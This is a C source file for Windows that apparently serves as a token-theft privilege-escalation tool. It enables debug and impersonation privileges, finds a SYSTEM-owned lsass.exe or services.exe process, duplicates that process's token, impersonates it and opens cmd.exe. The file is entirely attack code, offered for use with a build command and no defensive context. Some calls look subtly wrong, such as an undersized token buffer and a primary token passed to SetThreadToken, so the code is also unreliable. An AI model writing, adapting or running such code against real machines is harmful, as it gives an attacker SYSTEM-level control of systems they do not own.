#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <tchar.h>
#pragma comment(lib, "advapi32.lib")

//gcc sc.c -o sc.exe -ladvapi32

void PrintErrorAndExit(const char* message) {
    printf("%s\n", message);
    printf("Error code : %d\n", GetLastError());
    exit(-1);
}

void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        PrintErrorAndExit("LookupPrivilegeValue() Failed");
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        PrintErrorAndExit("AdjustTokenPrivileges() Failed");
    }

    printf("[+] Privilege '%s' enabled!\n", lpszPrivilege);
}

DWORD FindSystemProcess() {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD systemPID = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        PrintErrorAndExit("CreateToolhelp32Snapshot() Failed");
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_tcscmp(pe32.szExeFile, _T("lsass.exe")) == 0 ||
                _tcscmp(pe32.szExeFile, _T("services.exe")) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    HANDLE hToken;
                    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                        TOKEN_USER tokenUser;
                        DWORD tokenLen;
                        if (GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(TOKEN_USER), &tokenLen)) {
                            SID_NAME_USE sidType;
                            TCHAR name[256], domain[256];
                            DWORD nameLen = sizeof(name) / sizeof(TCHAR), domainLen = sizeof(domain) / sizeof(TCHAR);

                            if (LookupAccountSid(NULL, tokenUser.User.Sid, name, &nameLen, domain, &domainLen, &sidType)) {
                                if (_tcscmp(name, _T("SYSTEM")) == 0) {
                                    systemPID = pe32.th32ProcessID;
                                    CloseHandle(hToken);
                                    CloseHandle(hProcess);
                                    break;
                                }
                            }
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    } else {
        PrintErrorAndExit("Process32First() Failed");
    }

    CloseHandle(hSnapshot);
    return systemPID;
}

void StealAndImpersonateToken(DWORD systemPID) {
    HANDLE rProc, TokenHandle, DuplicateTokenHandle;

    rProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPID);
    if (!rProc) {
        PrintErrorAndExit("OpenProcess() Failed");
    }

    if (!OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_QUERY, &TokenHandle)) {
        PrintErrorAndExit("OpenProcessToken() Failed");
    }

    if (!DuplicateTokenEx(TokenHandle, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle)) {
        PrintErrorAndExit("DuplicateTokenEx() Failed");
    }

    if (!SetThreadToken(NULL, DuplicateTokenHandle)) {
        PrintErrorAndExit("SetThreadToken() Failed");
    }

    printf("[+] Token stolen and impersonated successfully!\n");

    CloseHandle(TokenHandle);
    CloseHandle(DuplicateTokenHandle);
    CloseHandle(rProc);
}

int main() {
    HANDLE CurrentTokenHandle;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)) {
        PrintErrorAndExit("Couldn't retrieve current process token");
    }

    // Enable necessary privileges
    EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);
    EnablePrivileges(CurrentTokenHandle, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
    EnablePrivileges(CurrentTokenHandle, SE_IMPERSONATE_NAME, TRUE);

    // Find a SYSTEM process
    DWORD systemPID = FindSystemProcess();
    if (systemPID == 0) {
        printf("No SYSTEM process found :(\n");
        return -1;
    }
    printf("[+] Found SYSTEM process with PID: %d\n", systemPID);

    // Steal and impersonate token
    StealAndImpersonateToken(systemPID);

    // Optional: Execute a command as SYSTEM
    printf("[*] Running command as SYSTEM...\n");
    system("cmd.exe");

    CloseHandle(CurrentTokenHandle);
    return 0;
}
